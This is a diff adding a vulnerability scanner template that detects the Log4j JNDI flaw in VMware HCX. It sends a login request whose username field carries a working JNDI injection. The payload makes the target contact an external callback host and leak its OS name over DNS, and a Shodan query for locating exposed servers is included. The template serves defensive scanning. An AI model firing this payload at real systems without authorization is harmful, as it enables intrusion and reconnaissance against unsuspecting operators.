@@ -1,0 +1,55 @@
+id: vmware-hcx-log4j
+
+info:
+  name: VMware HCX - Remote Code Execution (Apache Log4j)
+  author: pussycat0x,DhiyaneshDK
+  severity: critical
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  metadata:
+    verified: true
+    shodan-query: title:"VMware HCX"
+  tags: cve,cve2021,rce,jndi,log4j,vmware
+
+
+requests:
+  - raw:
+      - |
+        POST /hybridity/api/sessions HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+        Accept: application/json
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+        Origin: {{BaseURL}}
+
+        {
+          "authType": "password",
+          "username": "${jndi:ldap://${sys:os.name}.{{interactsh-url}}}",
+          "password": "admin"
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
